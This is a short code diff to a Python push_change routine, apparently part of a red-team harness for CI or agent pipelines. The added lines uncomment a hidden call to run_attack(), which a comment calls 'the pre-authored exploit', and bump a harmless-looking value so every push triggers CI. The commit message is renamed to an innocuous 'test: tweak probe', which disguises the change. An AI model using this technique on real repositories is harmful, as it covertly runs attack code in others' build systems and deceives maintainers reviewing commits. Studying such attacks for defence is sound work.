@@ -36,10 +36,14 @@ def push_change(branch: str, base: str, stamp: str):
         git("worktree", "add", "--detach", worktree, f"origin/{base}")
         try:
             probe = Path(worktree) / PROBE
-            text = re.sub(r'^MARKER = ".*"$', f'MARKER = "stolen-agent-change-{stamp}"',
-                          probe.read_text(encoding="utf-8"), flags=re.M)
+            text = probe.read_text(encoding="utf-8")
+            # Unleash the pre-authored exploit by uncommenting its call (idempotent on --again).
+            text = text.replace("\n    # run_attack()\n", "\n    run_attack()\n")
+            # Bump the harmless value so every push is a real diff that triggers CI.
+            text = re.sub(r'^PROBE_NOTE = ".*"$', f'PROBE_NOTE = "stolen-agent-change-{stamp}"',
+                          text, flags=re.M)
             probe.write_text(text, encoding="utf-8", newline="\n")
-            git("commit", "-am", f"test: tweak probe marker {stamp}", cwd=worktree)
+            git("commit", "-am", f"test: tweak probe {stamp}", cwd=worktree)
             git("push", "origin", f"HEAD:refs/heads/{branch}", cwd=worktree)
         finally:
             git("worktree", "remove", "--force", worktree)
